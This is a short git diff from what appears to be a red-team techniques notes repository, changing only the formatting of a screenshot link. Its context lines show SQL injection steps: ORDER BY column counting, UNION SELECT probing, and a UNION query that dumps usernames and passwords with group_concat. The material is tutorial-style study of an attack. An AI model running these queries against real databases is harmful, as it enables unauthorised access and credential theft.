@@ -15,7 +15,7 @@ mysql> select * from users where user_id = 1 order by 6;
 mysql> select * from users where user_id = 1 union select 1,2,3,4,5,6;
 ```
 
-![](<https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/tree/master/.gitbook/assets/Screenshot from 2018-11-17 15-59-39.png>)
+![](https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/tree/master/.gitbook/assets/Screenshot from 2018-11-17 15-59-39.png)
 
 ```sql
 select * from users where user_id = 1 union all select 1,(select group_concat(user,0x3a,password) from users),3,4,5,6;
